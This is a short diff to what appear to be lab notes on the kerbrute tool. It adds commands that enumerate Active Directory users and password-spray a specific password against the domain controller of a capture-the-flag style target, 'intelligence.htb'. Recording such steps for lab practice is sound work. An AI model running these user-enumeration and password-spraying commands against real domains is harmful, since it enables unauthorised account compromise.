@@ -39,3 +39,10 @@ Flags:
 Use "kerbrute [command] --help" for more information about a command.
 ```
 
+```
+./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d intelligence.htb users-unique.txt
+```
+
+```
+./kerbrute_linux_amd64 passwordspray --dc 10.129.95.154 -d intelligence.htb users-unique.txt 'NewIntelligenceCorpUser9876'
+```
